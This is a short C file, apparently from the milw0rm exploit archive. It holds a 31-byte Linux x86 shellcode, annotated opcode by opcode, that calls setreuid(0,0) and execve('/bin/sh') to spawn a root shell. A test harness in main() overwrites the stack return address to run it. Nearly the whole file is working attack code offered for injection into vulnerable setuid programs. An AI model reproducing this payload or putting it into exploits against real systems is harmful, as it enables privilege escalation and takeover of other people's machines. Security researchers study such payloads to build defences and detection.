/*
 * (linux/x86) setreuid(0, 0) + execve("/bin/sh", ["/bin/sh", NULL], NULL) - 31 bytes
 * - izik <izik@tty64.org>
 */

char shellcode[] =

	"\x6a\x46"              // push $0x46
	"\x58"                  // pop %eax
	"\x31\xdb"              // xor %ebx,%ebx
	"\x31\xc9"              // xor %ecx,%ecx
	"\xcd\x80"              // int $0x80
	"\x99"                  // cltd
	"\xb0\x0b"              // mov $0xb,%al
	"\x52"                  // push %edx
	"\x68\x2f\x2f\x73\x68"  // push $0x68732f2f
	"\x68\x2f\x62\x69\x6e"  // push $0x6e69622f
	"\x89\xe3"              // mov %esp,%ebx
	"\x52"                  // push %edx
	"\x53"                  // push %ebx
	"\x89\xe1"              // mov %esp,%ecx
	"\xcd\x80";             // int $0x80

int main(int argc, char **argv) {
	int *ret;
	ret = (int *)&ret + 2;
	(*ret) = (int) shellcode;
}

// milw0rm.com [2006-01-21]